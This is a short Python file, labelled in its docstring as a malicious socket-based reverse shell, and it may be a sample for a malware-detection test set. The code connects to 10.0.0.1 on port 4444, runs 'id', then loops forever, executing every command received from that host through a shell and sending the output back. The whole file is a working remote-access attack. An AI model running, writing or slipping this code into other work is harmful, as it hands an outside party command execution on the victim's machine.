"""Malicious: Socket-based reverse shell."""
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
os.system("id")

while True:
    cmd = s.recv(1024).decode()
    output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    s.send(output.stdout.read())
